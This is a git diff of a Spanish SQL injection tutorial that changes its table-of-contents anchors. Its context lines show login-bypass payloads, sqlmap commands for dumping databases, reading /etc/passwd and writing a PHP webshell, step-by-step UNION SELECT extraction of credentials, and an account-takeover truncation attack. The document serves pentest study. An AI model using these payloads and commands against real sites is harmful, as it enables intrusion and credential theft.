@@ -7,46 +7,46 @@
 ## 📑 Índice
 
 ### 1. Introducción
-- [❓ ¿Qué es una SQL Injection?](#❓-qué-es-una-sql-injection)
-- [📌 ¿Por qué ocurre?](#📌-por-qué-ocurre)
+- [❓ ¿Qué es una SQL Injection?](#quees)
+- [📌 ¿Por qué ocurre?](#porqueocurre)
 
 ### 2. Conceptos Básicos
-- [🔍 Ejemplo sencillo](#🔍-ejemplo-sencillo)
-- [🔍 ¿Cómo detectar la vulnerabilidad?](#🔍-cómo-detectar-la-vulnerabilidad)
-- [📝 Inyecciones comunes (manuales)](#inyecciones-comunes-manuales)
+- [🔍 Ejemplo sencillo](#sencillo)
+- [🔍 ¿Cómo detectar la vulnerabilidad?](#detectar)
+- [📝 Inyecciones comunes (manuales)](#comunes)
 
 ### 3. Automatización con sqlmap
-- [🤖 Automatizar el ataque](#🤖-automatizar-el-ataque)
-  - [1️⃣ Buscar bases de datos](#1️⃣-buscar-bases-de-datos)
-  - [2️⃣ Enumerar tablas](#2️⃣-enumerar-las-tablas)
-  - [3️⃣ Enumerar columnas](#3️⃣-enumerar-las-columnas)
-  - [4️⃣ Extraer datos](#4️⃣-extraer-los-datos)
-- [🎯 Ataques avanzados con sqlmap](#🎯-ataques-avanzados-con-sqlmap)
-  - [🔹 Especificar parámetro vulnerable](#🔹-especificar-el-parámetro-vulnerable)
-  - [🔹 Aumentar nivel y riesgo](#🔹-aumentar-el-nivel-y-riesgo-del-ataque)
-  - [🔹 Uso de cookies](#🔹-usar-cookies)
-  - [🔹 Obtener usuario actual](#🔹-obtener-el-usuario-actual)
-  - [🔹 Obtener versión del motor](#🔹-obtener-versión-del-motor)
-  - [🔹 Leer archivos](#🔹-leer-archivos)
-  - [🔹 Escribir archivos (WebShell)](#🔹-escribir-archivos-webshell)
+- [🤖 Automatizar el ataque](#automatizar)
+  - [1️⃣ Buscar bases de datos](#buscar)
+  - [2️⃣ Enumerar tablas](#tablas)
+  - [3️⃣ Enumerar columnas](#columnas)
+  - [4️⃣ Extraer datos](#extraer)
+- [🎯 Ataques avanzados con sqlmap](#avanzadosqlmap)
+  - [🔹 Especificar parámetro vulnerable](#especificarparametro)
+  - [🔹 Aumentar nivel y riesgo](#nivel)
+  - [🔹 Uso de cookies](#cookies)
+  - [🔹 Obtener usuario actual](#usuarioactual)
+  - [🔹 Obtener versión del motor](#version)
+  - [🔹 Leer archivos](#leer)
+  - [🔹 Escribir archivos (WebShell)](#escribir)
 
 ### 4. Guía de ataque manual (UNION SELECT)
-- [🛠️ Paso 1️⃣ Detectar vulnerabilidad](#🛠️-paso-1️⃣-detectar-la-vulnerabilidad)
-- [🛠️ Paso 2️⃣ Identificar número de columnas](#🛠️-paso-2️⃣-identificar-el-número-de-columnas)
-- [🛠️ Paso 3️⃣ Usar UNION SELECT](#🛠️-paso-3️⃣-usar-union-select)
-- [🛠️ Paso 4️⃣ Extraer datos reales](#🛠️-paso-4️⃣-extraer-datos-reales)
-- [🛠️ Paso 5️⃣ Listar bases de datos](#🛠️-paso-5️⃣-listar-bases-de-datos)
-- [🛠️ Paso 6️⃣ Listar nombres de tablas](#🛠️-paso-6️⃣-listar-nombres-de-tablas)
-- [🛠️ Paso 7️⃣ Listar columnas](#🛠️-paso-7️⃣-listar-columnas)
-- [🛠️ Paso 8️⃣ Mostrar datos concatenados](#🛠️-paso-8️⃣-mostrar-datos-concatenados)
-- [✅ Notas importantes](#✅-notas)
+- [🛠️ Paso 1️⃣ Detectar vulnerabilidad](#paso1)
+- [🛠️ Paso 2️⃣ Identificar número de columnas](#paso2)
+- [🛠️ Paso 3️⃣ Usar UNION SELECT](#paso3)
+- [🛠️ Paso 4️⃣ Extraer datos reales](#paso4)
+- [🛠️ Paso 5️⃣ Listar bases de datos](#paso5)
+- [🛠️ Paso 6️⃣ Listar nombres de tablas](#paso6)
+- [🛠️ Paso 7️⃣ Listar columnas](#paso7)
+- [🛠️ Paso 8️⃣ Mostrar datos concatenados](#paso8)
+- [✅ Notas importantes](#notasss)
 
 ### 5. Ataques específicos
-- [🗂️ SQL Truncation Attack](#🗂️-sql-truncation-attack)
-  - [¿Qué supone?](#qué-supone)
-  - [Ejemplo simple](#ejemplo-simple)
-  - [Ejemplo en código (Python + SQLite)](#ejemplo-en-código-python--sqlite-🐍)
-  - [Resumen y recomendaciones](#resumen-📝)
+- [🗂️ SQL Truncation Attack](#truncation1)
+  - [¿Qué supone?](#truncation2)
+  - [Ejemplo simple](#truncation3)
+  - [Ejemplo en código (Python + SQLite)](#pyhon)
+  - [Resumen y recomendaciones](#resumennn)
 
 ---
 
@@ -54,7 +54,7 @@
    
 
 ---
-
+<a name="quees"></a>
 ## ❓ ¿Qué es una SQL Injection?
 
 Una **SQL Injection** es un tipo de ataque que ocurre cuando un atacante es capaz de "inyectar" código SQL malicioso en una consulta que se envía a la base de datos.
@@ -67,13 +67,13 @@ Una **SQL Injection** es un tipo de ataque que ocurre cuando un atacante es capa
 - ejecutar comandos administrativos en la base de datos.
 
 ---
-
+<a name="porqueocurre"></a>
 ## 📌 ¿Por qué ocurre?
 
 Sucede cuando una aplicación web **no valida correctamente la entrada del usuario** antes de usarla en una consulta SQL.
 
 ---
-
+<a name="sencillo"></a>
 ## 🔍 Ejemplo sencillo
 
 Supongamos que en una página de login tenemos este código en PHP:
@@ -100,7 +100,7 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 Como `'1'='1'` siempre es verdadero, es posible que el atacante logre iniciar sesión **sin conocer la contraseña**.
 
 ---
-
+<a name="detectar"></a>
 ## 🔍 ¿Cómo detectar la vulnerabilidad?
 
 Cuando vemos campos a rellenar, intentaremos inyectar código y observaremos la respuesta.  
@@ -123,7 +123,7 @@ Luego corregimos la consulta.
 Podemos automatizar esta tarea con diccionarios como SecLists.
 
 ---
-
+<a name="comunes"></a>
 ## Inyecciones comunes (manuales)
 
 ```sql
@@ -182,29 +182,29 @@ or 1=1/*
 ```
 
 ---
-
+<a name="automatizar"></a>
 ## 🤖 Automatizar el ataque
 
 Podemos automatizar el ataque con herramientas como `sqlmap`.
-
+<a name="buscar"></a>
 ### 1️⃣ Buscar bases de datos
 
 ```bash
 sqlmap -u http://<IP> --forms --dbs --batch
 ```
-
+<a name="tablas"></a>
 ### 2️⃣ Enumerar las tablas
 
 ```bash
 sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> --tables --batch
 ```
-
+<a name="columnas"></a>
 ### 3️⃣ Enumerar las columnas
 
 ```bash
 sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> --columns --batch
 ```
-
+<a name="extraer"></a>
 ### 4️⃣ Extraer los datos
 
 ```bash
@@ -212,45 +212,45 @@ sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> 
 ```
 
 ---
-
+<a name="avanzadosqlmap"></a>
 ## 🎯 Ataques avanzados con SQLMap
-
+<a name="especificarparametro"></a>
 ### 🔹 Especificar el parámetro vulnerable
 
 ```bash
 sqlmap -u "http://<IP>/pagina.php?id=1" -p id --dbs --batch
 ```
-
+<a name="nivel"></a>
 ### 🔹 Aumentar el nivel y riesgo del ataque
 
 ```bash
 sqlmap -u http://<IP> --forms --dbs --risk=3 --level=5 --batch
 ```
-
+<a name="cookies"></a>
 ### 🔹 Usar cookies
 
 ```bash
 sqlmap -u http://<IP> --cookie="PHPSESSID=XXXXXXXXXXXXX" --dbs --batch
 ```
-
+<a name="usuarioactual"></a>
 ### 🔹 Obtener el usuario actual
 
 ```bash
 sqlmap -u http://<IP> --current-user --batch
 ```
-
+<a name="version"></a>
 ### 🔹 Obtener versión del motor
 
 ```bash
 sqlmap -u http://<IP> --banner --batch
 ```
-
+<a name="leer"></a>
 ### 🔹 Leer archivos
 
 ```bash
 sqlmap -u http://<IP> --file-read="/etc/passwd" --batch
 ```
-
+<a name="escribir"></a>
 ### 🔹 Escribir archivos (WebShell)
 
 ```bash
@@ -262,7 +262,7 @@ sqlmap -u http://<IP> --file-write="shell.php" --file-dest="/var/www/html/shell.
 ## 🛠️ Guía de ataque manual (UNION SELECT)
 
 ---
-
+<a name="paso1"></a>
 ## Paso 1️⃣ Detectar la vulnerabilidad
 
 Inserta una comilla simple `'` en un parámetro de entrada (formulario, URL, etc.).
@@ -280,7 +280,7 @@ http://ejemplo.com/product.php?id=-1
 ```
 
 ---
-
+<a name="paso2"></a>
 ## Paso 2️⃣ Identificar el número de columnas con ORDER BY
 
 ```bash
@@ -293,7 +293,7 @@ http://ejemplo.com/product.php?id=1 ORDER BY 3-- -
 Cuando aparezca un error, el número anterior indica la cantidad correcta de columnas.
 
 ---
-
+<a name="paso3"></a>
 ## Paso 3️⃣ Usar UNION SELECT para obtener datos
 
 Ejemplo con 3 columnas:
@@ -305,7 +305,7 @@ http://ejemplo.com/product.php?id=1 UNION SELECT 1,2,3-- -
 Si ves 1, 2, 3 en la página, la inyección funciona.
 
 ---
-
+<a name="paso4"></a>
 ## Paso 4️⃣ Extraer datos reales
 
 Ejemplo:
@@ -315,7 +315,7 @@ http://ejemplo.com/product.php?id=1 UNION SELECT username,password,3 FROM users-
 ```
 
 ---
-
+<a name="paso5"></a>
 ## Paso 5️⃣ Listar bases de datos
 
 ```bash
@@ -329,7 +329,7 @@ http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM inform
 ```
 
 ---
-
+<a name="paso6"></a>
 ## Paso 6️⃣ Listar nombres de tablas
 
 ```bash
@@ -337,7 +337,7 @@ http://ejemplo.com/product.php?id=1 UNION SELECT 1,table_name,3,4,5 FROM informa
 ```
 
 ---
-
+<a name="paso7"></a>
 ## Paso 7️⃣ Listar columnas
 
 ```bash
@@ -345,7 +345,7 @@ http://ejemplo.com/product.php?id=1 UNION SELECT 1,column_name,3,4,5 FROM inform
 ```
 
 ---
-
+<a name="paso8"></a>
 ## Paso 8️⃣ Mostrar datos concatenados
 
 ```bash
@@ -355,7 +355,7 @@ http://ejemplo.com/product.php?id=1 UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUM
 (0x3a representa el carácter ":")
 
 ---
-
+<a name="notasss"></a>
 ## ✅ Notas
 
 - Adaptar el número de columnas a las de la consulta original.
@@ -364,11 +364,11 @@ http://ejemplo.com/product.php?id=1 UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUM
 
 ---
 
-
+<a name="truncation1"></a>
 ## 🗂️ SQL Truncation Attack 
 
 El **SQL truncation** es una técnica que explota cómo algunas bases de datos o aplicaciones manejan cadenas de texto más largas de lo permitido por el esquema de la base de datos.
-
+<a name="truncation2"></a>
 ### ¿Qué supone esto?
 
 Supongamos que tenemos un panel de registro y conocemos un usuario administrador, por ejemplo:
@@ -397,7 +397,7 @@ Si la aplicación no controla esto bien, puede causar:
 👉 En este caso, la aplicación acaba **sobrescribiendo** al usuario `admin` con nuestra contraseña. Luego, tendremos acceso como el admin legítimo.
 
 ---
-
+<a name="truncation3"></a>
 ## Ejemplo simple 📋
 
 ### Tabla de usuarios:
@@ -432,7 +432,7 @@ VALUES ('admin             lala', 'hackedpass');
   - **Sobrescribir** al usuario `admin`, dependiendo de cómo esté implementada la lógica de inserción (por ejemplo, si se hace `INSERT OR REPLACE` o `ON DUPLICATE KEY UPDATE`).
 
 ---
-
+<a name="python"></a>
 ## Ejemplo en código (Python + SQLite) 🐍
 
 ```python
@@ -467,7 +467,7 @@ conn.close()
 ```
 
 ---
-
+<a name="resumennn"></a>
 ## Resumen 📝
 
 - SQL truncation es un ataque muy sencillo pero efectivo si el tamaño de los campos no está bien validado.
